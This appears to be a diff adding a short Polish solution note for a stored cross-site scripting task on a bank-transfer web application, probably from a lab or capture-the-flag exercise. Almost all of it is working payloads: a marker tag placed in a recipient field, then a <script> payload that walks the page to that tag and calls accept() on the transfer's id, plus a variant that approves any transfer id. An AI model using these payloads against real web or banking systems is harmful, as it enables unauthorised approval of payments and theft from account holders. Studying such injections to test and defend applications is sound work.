@@ -1,0 +1,10 @@
+Do przelewu, który chcemy zatwierdzić, dodajemy jakiś charackterystyczny tag, np.
+Obiorca: Adam Kowalski<x/>
+
+Następnie wykonujemy przelew, w którym wyszukujemy podany wcześniej tag
+
+5<script>a=document.getElementsByTagName('x')[0].parentElement.parentElement.children;accept(a[a.length-1].id)</script>
+					  ^
+
+Możemy też zatwierdzić przelew o dowolnym id
+<script>accept(id)</script>
